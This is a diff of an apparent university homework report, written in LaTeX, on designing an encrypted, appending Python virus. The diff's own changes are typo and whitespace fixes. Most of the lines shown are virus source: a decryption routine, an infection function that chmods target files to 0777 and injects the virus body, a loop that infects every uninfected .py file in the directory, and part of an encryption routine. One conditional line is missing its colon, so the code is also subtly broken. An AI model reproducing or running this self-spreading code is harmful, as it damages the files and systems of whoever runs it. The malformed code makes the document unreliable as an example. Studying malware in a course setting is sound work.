@@ -72,9 +72,9 @@ The virus will be an appending one. It will spread as follows:
 \end{enumerate}
 \end{enumerate}
 \section{Virus design}
-We decide to write the homework assigned using the language Python.
+We decide to write the homework assigned using the Python language.
 
-The virus is divived in two principle parts:
+The virus is divided in two principal parts:
 \begin{itemize}
 \item virus decryption routine: it is not encrypted and it has to decrypt the encrypted virus program body and execute it;
 \item encrypted virus program body: it is encrypted (using the first line of the virus as the encryption key) and contains the infection and payload phases.
@@ -108,7 +108,7 @@ copy = False
 # Initialize an empty string
 cipher_payload = ''
 
-# Search for the encrypted main body of the virus 
+# Search for the encrypted main body of the virus
 # and copy it into cipher_payload
 for line in this:
    if line.strip() == '# Start payload':
@@ -151,7 +151,7 @@ def infect(filename):
    destination = open(filename, 'w')
    # Set execution permission to the file
    os.chmod(filename, 0777)
-   # Open the temporary file   
+   # Open the temporary file
    source = open(filename + '-copy', 'r')
    # Open this file
    this = open(__main__.__file__, 'r')
@@ -167,7 +167,7 @@ def infect(filename):
    copy = False
    # Initialize result
    result = ''
-   # Copy the unencrypted payload into the new file 
+   # Copy the unencrypted payload into the new file
    # only if the string '# Start Unencrypted'  is found
    for line in this:
       if line.strip() == '# Start Unencrypted':
@@ -188,8 +188,8 @@ def infect(filename):
    source.close()
    destination.close()
    this.close()
-   
-# Function to find and infect files in the current directory 
+
+# Function to find and infect files in the current directory
 def find_and_infect_files():
    path = '.'
    # Lists all files inside current directory
@@ -197,13 +197,13 @@ def find_and_infect_files():
 
    # For each file try to infect it
    for filename in dirs:
-      # If file ends with .py and it is not already infected 
+      # If file ends with .py and it is not already infected
       if filename.endswith('.py') and (not is_infected(filename))
          print "Infected " +  str(filename)
          # Infect file with the virus
          infect(filename)
-         
-# Function to encrypt 
+
+# Function to encrypt
 def encrypt(data,filename):
    source = open(filename + '-copy', 'r')
    # Generate a new random initialization vector
